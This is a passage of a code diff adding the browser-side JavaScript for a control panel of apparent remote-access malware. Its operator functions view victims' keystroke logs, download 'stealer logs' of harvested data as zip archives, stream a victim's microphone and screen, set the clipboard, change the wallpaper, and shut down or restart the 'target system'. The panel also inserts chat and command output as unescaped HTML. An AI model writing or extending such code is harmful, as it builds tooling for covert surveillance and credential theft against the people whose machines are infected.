+                    }
+                    
+                    const sourceSampleRate = d.rate || 48000;
+                    const contextSampleRate = audioContext.sampleRate;
+                    
+                    if (sourceSampleRate === contextSampleRate) {
+                        const audioBuffer = audioContext.createBuffer(1, float32.length, sourceSampleRate);
+                        audioBuffer.getChannelData(0).set(float32);
+                        audioQueue.push(audioBuffer);
+                    } else {
+                        const ratio = contextSampleRate / sourceSampleRate;
+                        const newLength = Math.floor(float32.length * ratio);
+                        const resampled = new Float32Array(newLength);
+                        
+                        for (let i = 0; i < newLength; i++) {
+                            const srcIndex = i / ratio;
+                            const srcIndexFloor = Math.floor(srcIndex);
+                            const srcIndexCeil = Math.min(srcIndexFloor + 1, float32.length - 1);
+                            const t = srcIndex - srcIndexFloor;
+                            resampled[i] = float32[srcIndexFloor] * (1 - t) + float32[srcIndexCeil] * t;
+                        }
+                        
+                        const audioBuffer = audioContext.createBuffer(1, resampled.length, contextSampleRate);
+                        audioBuffer.getChannelData(0).set(resampled);
+                        audioQueue.push(audioBuffer);
+                    }
+                    
+                    if(!isPlaying && audioQueue.length > 0) {
+                        playNextChunk();
+                    }
+                } catch(e) {
+                    console.error('[MIC] Audio decode error:', e);
+                }
+            }
+        });
+
+        function playNextChunk() {
+            if(audioQueue.length === 0) {
+                isPlaying = false;
+                return;
+            }
+            
+            isPlaying = true;
+            const buffer = audioQueue.shift();
+            const source = audioContext.createBufferSource();
+            source.buffer = buffer;
+            source.connect(audioContext.destination);
+            
+            source.onended = () => {
+                playNextChunk();
+            };
+            
+            source.start();
+        }
+
+        socket.on('mic_stopped', d => {
+            if(d.client_id === selectedClientId) {
+                console.log('[MIC] Stream ended by client');
+                if(micOn) {
+                    toggleMic(); // Force stop UI
+                }
+            }
+        });
+
+        // Keylog session tracking
+        let keylogSessionStart = null;
+        let keylogSessionTimer = null;
+
+        function startKeylogSession() {
+            if (!keylogSessionStart) {
+                keylogSessionStart = Date.now();
+                keylogSessionTimer = setInterval(() => {
+                    const elapsed = Math.floor((Date.now() - keylogSessionStart) / 1000);
+                    const hours = Math.floor(elapsed / 3600).toString().padStart(2, '0');
+                    const mins = Math.floor((elapsed % 3600) / 60).toString().padStart(2, '0');
+                    const secs = (elapsed % 60).toString().padStart(2, '0');
+                    
+                    const sessionEl = document.getElementById('keylogSession');
+                    if(sessionEl) {
+                        sessionEl.textContent = `${hours}:${mins}:${secs}`;
+                    }
+                }, 1000);
+            }
+        }
+
+        function stopKeylogSession() {
+            if (keylogSessionTimer) {
+                clearInterval(keylogSessionTimer);
+                keylogSessionTimer = null;
+                keylogSessionStart = null;
+                const sessionEl = document.getElementById('keylogSession');
+                if(sessionEl) {
+                    sessionEl.textContent = '00:00:00';
+                }
+            }
+        }
+
+        // Keylog & Chat
+        socket.on('keylog_update', d => { 
+            if(d.client_id === selectedClientId) {
+                document.getElementById('keylogArea').value = d.data;
+                // Обновляем статистику
+                const statsEl = document.getElementById('keylogStats');
+                if(statsEl) {
+                    const charCount = d.data ? d.data.length : 0;
+                    statsEl.textContent = `${charCount.toLocaleString()} chars`;
+                }
+                
+                // Запускаем таймер сессии если есть данные
+                if(d.data && d.data.length > 0) {
+                    startKeylogSession();
+                } else {
+                    stopKeylogSession();
+                }
+            }
+        });
+
+        // Функция скачивания кейлогов
+        function downloadKeylog() {
+            if(!selectedClientId) {
+                alert('Please select a client first');
+                return;
+            }
+            
+            console.log('[KEYLOG] Requesting download for client:', selectedClientId);
+            socket.emit('download_keylog', {target_client: selectedClientId});
+        }
+
+        // Функция очистки кейлогов
+        function clearKeylog() {
+            if(!selectedClientId) {
+                alert('Please select a client first');
+                return;
+            }
+            
+            if(confirm('Clear keylog buffer? This action cannot be undone.')) {
+                socket.emit('clear_keylog', {target_client: selectedClientId});
+                document.getElementById('keylogArea').value = '';
+                const statsEl = document.getElementById('keylogStats');
+                if(statsEl) {
+                    statsEl.textContent = '0 chars';
+                }
+                stopKeylogSession(); // Сбрасываем таймер сессии
+                console.log('[KEYLOG] Buffer cleared for client:', selectedClientId);
+            }
+        }
+
+        // Обработчик готового файла кейлогов
+        socket.on('keylog_download_ready', d => {
+            if(d.client_id !== selectedClientId) return;
+            
+            console.log('[KEYLOG] Download ready:', d.filename);
+            
+            try {
+                // Декодируем base64 данные
+                const binaryString = atob(d.data);
+                const bytes = new Uint8Array(binaryString.length);
+                for (let i = 0; i < binaryString.length; i++) {
+                    bytes[i] = binaryString.charCodeAt(i);
+                }
+                
+                // Создаем blob и скачиваем
+                const blob = new Blob([bytes], { type: 'text/plain;charset=utf-8' });
+                const url = URL.createObjectURL(blob);
+                
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = d.filename;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                
+                setTimeout(() => URL.revokeObjectURL(url), 100);
+                
+                console.log('[KEYLOG] Download completed:', d.filename);
+            } catch(e) {
+                console.error('[KEYLOG] Download error:', e);
+                alert('Download failed: ' + e.message);
+            }
+        });
+
+        function sendChat() {
+            const i = document.getElementById('chatInput');
+            if(selectedClientId && i.value) {
+                socket.emit('chat_message', {target_client: selectedClientId, message: i.value});
+                i.value = '';
+            }
+        }
+        socket.on('chat_message', d => {
+            const box = document.getElementById('chatBox');
+            const align = d.from === 'You' ? 'items-end' : 'items-start';
+            const color = d.from === 'You' ? 'bg-theme/20 text-white border-theme/30' : 'bg-white/10 text-zinc-300 border-white/5';
+            
+            box.innerHTML += `
+                <div class="flex flex-col ${align} mb-2">
+                    <span class="text-[9px] text-zinc-500 mb-0.5 font-bold uppercase">${d.from}</span>
+                    <span class="px-3 py-1.5 rounded-lg text-xs border ${color}">${d.message}</span>
+                </div>`;
+            box.scrollTop = box.scrollHeight;
+        });
+
+        function sendFun(type, args) { if(selectedClientId) socket.emit('run_fun', {target_client: selectedClientId, type: type, ...args}); }
+
+        // System commands
+        function systemCommand(command, args = {}) {
+            if(!selectedClientId) return;
+            socket.emit(command, {target_client: selectedClientId, ...args});
+        }
+
+        function confirmAction(action) {
+            if(!selectedClientId) return;
+            
+            const messages = {
+                'shutdown': 'Are you sure you want to shutdown the target system?',
+                'restart': 'Are you sure you want to restart the target system?'
+            };
+            
+            if(confirm(messages[action])) {
+                const delay = prompt('Enter delay in seconds (default: 60):', '60');
+                const delayNum = parseInt(delay) || 60;
+                socket.emit(`system_${action}`, {target_client: selectedClientId, delay: delayNum});
+            }
+        }
+
+        function showMessage() {
+            if(!selectedClientId) return;
+            
+            const title = document.getElementById('msgTitle').value || 'Message';
+            const text = document.getElementById('msgText').value || 'Hello!';
+            
+            socket.emit('show_message', {
+                target_client: selectedClientId,
+                title: title,
+                text: text,
+                type: 0
+            });
+            
+            // Clear inputs
+            document.getElementById('msgTitle').value = '';
+            document.getElementById('msgText').value = '';
+        }
+
+        function setClipboard() {
+            if(!selectedClientId) return;
+            
+            const text = document.getElementById('clipboardText').value;
+            if(!text) return;
+            
+            socket.emit('set_clipboard', {
+                target_client: selectedClientId,
+                text: text
+            });
+            
+            // Clear input
+            document.getElementById('clipboardText').value = '';
+        }
+
+        // Stealer log download
+        function downloadStealerLogs() {
+            if(!selectedClientId) return;
+            socket.emit('download_stealer_logs', {target_client: selectedClientId});
+        }
+
+        // Chunked download state
+        let chunkedDownloads = {};
+
+        // Handle stealer download (single packet - small files)
+        socket.on('stealer_download_ready', d => {
+            if(d.client_id === selectedClientId) {
+                const link = document.createElement('a');
+                link.href = 'data:application/zip;base64,' + d.data;
+                link.download = d.filename;
+                link.click();
+            }
+        });
+
+        // Handle chunked download start
+        socket.on('stealer_download_ready_start', d => {
+            if(d.client_id === selectedClientId) {
+                console.log(`[DOWNLOAD] Starting chunked download: ${d.filename}, ${d.total_chunks} chunks`);
+                chunkedDownloads[d.filename] = {
+                    chunks: new Array(d.total_chunks),
+                    received: 0,
+                    total: d.total_chunks,
+                    totalSize: d.total_size
+                };
+            }
+        });
+
+        // Handle chunked download chunk
+        socket.on('stealer_download_ready_chunk', d => {
+            if(d.client_id === selectedClientId && chunkedDownloads[d.filename]) {
+                const download = chunkedDownloads[d.filename];
+                download.chunks[d.chunk_index] = d.data;
+                download.received++;
+                console.log(`[DOWNLOAD] Chunk ${download.received}/${download.total}`);
+            }
+        });
+
+        // Handle chunked download end
+        socket.on('stealer_download_ready_end', d => {
+            if(d.client_id === selectedClientId && chunkedDownloads[d.filename]) {
+                const download = chunkedDownloads[d.filename];
+                
+                // Combine all chunks
+                const fullData = download.chunks.join('');
+                console.log(`[DOWNLOAD] Complete: ${fullData.length} bytes`);
+                
+                // Download file
+                const link = document.createElement('a');
+                link.href = 'data:application/zip;base64,' + fullData;
+                link.download = d.filename;
+                link.click();
+                
+                // Cleanup
+                delete chunkedDownloads[d.filename];
+            }
+        });
+
+        // Wallpaper functions
+        function clearFileSelection() {
+            // Clear file selection when URL is entered
+            const fileInput = document.getElementById('wallpaperFile');
+            const btnElement = document.getElementById('fileStatusBtn');
+            
+            if (fileInput.value) {
+                fileInput.value = '';
+                btnElement.textContent = 'Choose File';
+                window.selectedWallpaperFile = null;
+            }
+        }
+        
+        function handleWallpaperFile(input) {
+            const file = input.files[0];
+            const btnElement = document.getElementById('fileStatusBtn');
+            
+            if (!file) {
+                btnElement.textContent = 'Choose File';
+                return;
+            }
+            
+            if (!file.type.startsWith('image/')) {
+                alert('Please select an image file');
+                input.value = '';
+                btnElement.textContent = 'Choose File';
+                return;
+            }
+            
+            const maxSize = 10 * 1024 * 1024; // 10MB
+            if (file.size > maxSize) {
+                alert('File too large. Maximum size is 10MB');
+                input.value = '';
+                btnElement.textContent = 'Choose File';
+                return;
+            }
+            
+            // Update button text with file name (truncate if too long)
+            const fileName = file.name.length > 15 ? file.name.substring(0, 12) + '...' : file.name;
+            btnElement.textContent = fileName;
+            
+            // Clear URL input when file is selected
+            document.getElementById('wallpaperUrl').value = '';
+            
+            // Store file for upload
+            window.selectedWallpaperFile = file;
+        }
+        
+        function changeWallpaper() {
+            if(!selectedClientId) return;
+            
+            const url = document.getElementById('wallpaperUrl').value.trim();
+            const file = window.selectedWallpaperFile;
+            
+            if (!url && !file) {
+                alert('Please enter a URL or select an image file');
+                return;
+            }
+            
+            if (file) {
+                // Upload file and set as wallpaper
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    const base64Data = e.target.result.split(',')[1];
+                    socket.emit('upload_wallpaper', {
+                        target_client: selectedClientId,
+                        filename: file.name,
+                        data: base64Data
+                    });
+                    console.log('[WALLPAPER] Uploading file:', file.name);
+                };
+                reader.readAsDataURL(file);
+            } else if (url) {
+                // Use URL - send directly
+                console.log('[WALLPAPER] Sending URL:', url);
+                socket.emit('change_wallpaper', {
+                    target_client: selectedClientId,
+                    url: url
+                });
+            }
+        }
+
+        // Logout function
+        function logout() {
+            window.location.href = '/logout';
+        }
+
+        // Command result handler (для отображения результатов FUN команд)
+        socket.on('command_result', d => {
+            if(d.client_id === selectedClientId) {
+                console.log('[FUN] Result:', d.output);
+                // Можно добавить уведомление или вывод в терминал
+                const term = document.getElementById('termOutput');
+                if(term) {
+                    term.innerHTML += `<div class="text-green-400 mb-2">${d.output}</div>`;
+                    term.scrollTop = term.scrollHeight;
+                }
+            }
+        });
+
+        // === SCREEN STREAM START/STOP ===
+        let screenStreamActive = false;
+        
+        function forceRefreshInfo() {
+            console.log('[FORCE_REFRESH] ========== MANUAL REFRESH ==========');
+            console.log('[FORCE_REFRESH] Selected client:', selectedClientId);
+            console.log('[FORCE_REFRESH] Clients cache:', clientsCache);
+            
+            if(!selectedClientId) {
+                alert('Please select a client first!');
+                return;
+            }
+            
+            if(!clientsCache[selectedClientId]) {
+                alert('Client not found in cache!');
+                console.error('[FORCE_REFRESH] Client not in cache:', selectedClientId);
+                return;
+            }
+            
+            // Request fresh info from server
+            console.log('[FORCE_REFRESH] Requesting fresh info from server...');
+            socket.emit('request_client_info', { client_id: selectedClientId });
+            
+            // Also update with cached data immediately
+            console.log('[FORCE_REFRESH] Client data:', clientsCache[selectedClientId]);
+            console.log('[FORCE_REFRESH] Calling updateInfo...');
+            updateInfo(clientsCache[selectedClientId]);
+            console.log('[FORCE_REFRESH] ========================================');
+        }
+        
+        function startScreenStream() {
+            if(!selectedClientId) {
+                alert('Please select a client first');
+                return;
+            }
+            
+            screenStreamActive = true;
+            document.getElementById('screenStartBtn').classList.add('hidden');
+            document.getElementById('screenStopBtn').classList.remove('hidden');
+            document.getElementById('screenStatusText').textContent = 'Streaming';
+            document.getElementById('screenStatusText2').textContent = 'Active';
+            document.getElementById('screenStatusDot').classList.remove('bg-zinc-600');
+            document.getElementById('screenStatusDot').classList.add('bg-green-500', 'animate-pulse');
+            
+            // Send current settings to client
+            socket.emit('update_screen_settings', {
+                target_client: selectedClientId,
+                quality: screenQuality,
+                fps: screenFPS,
+                resolution: screenResolution
+            });
+            
+            console.log('[SCREEN] Stream started:', screenFPS, 'FPS @', screenQuality, '% quality');
+        }
+        
+        function stopScreenStream() {
+            screenStreamActive = false;
+            document.getElementById('screenStartBtn').classList.remove('hidden');
+            document.getElementById('screenStopBtn').classList.add('hidden');
+            document.getElementById('screenStatusText').textContent = 'Stopped';
+            document.getElementById('screenStatusText2').textContent = 'Offline';
+            document.getElementById('screenStatusDot').classList.remove('bg-green-500', 'animate-pulse');
+            document.getElementById('screenStatusDot').classList.add('bg-zinc-600');
+            document.getElementById('screenPlaceholder').classList.remove('hidden');
+            document.getElementById('screenImg').src = '';
+            
+            // Send stop signal with FPS=0
+            if(selectedClientId) {
+                socket.emit('update_screen_settings', {
+                    target_client: selectedClientId,
+                    quality: screenQuality,
+                    fps: 0,
+                    resolution: screenResolution
+                });
+            }
+            
+            console.log('[SCREEN] Stream stopped');
+        }
+
+    </script>
+    
+    <!-- Mobile Enhancements -->
+    <script src="/static/js/mobile.js"></script>
+</body>
+</html>
